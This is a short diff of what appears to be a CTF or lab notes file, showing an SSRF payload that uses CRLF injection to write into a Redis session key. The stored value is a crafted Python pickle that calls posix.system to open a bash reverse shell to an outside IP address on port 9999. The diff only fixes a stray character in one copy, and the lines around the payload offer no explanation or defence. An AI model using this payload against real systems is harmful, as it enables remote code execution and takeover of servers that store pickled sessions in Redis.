@@ -8,7 +8,7 @@ payload worked on my labpc:
 url=http://redis:6379/?q=HTTP/1.1%0d%0aSET "session:abcd1234" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.54/9999 0>&1'q\x01\x85q\x02Rq\x03." %0d%0aHeader2:%0d%0a
 
 on kaibro's server:
-Wurl=http://redis:6379/?q=HTTP/1.1%0d%0aSET "session:abcd1234" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.54/9999 0>&1'q\x01\x85q\x02Rq\x03." %0d%0aHeader2:%0d%0a
+url=http://redis:6379/?q=HTTP/1.1%0d%0aSET "session:abcd1234" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.54/9999 0>&1'q\x01\x85q\x02Rq\x03." %0d%0aHeader2:%0d%0a
 
 
 serialized shell:
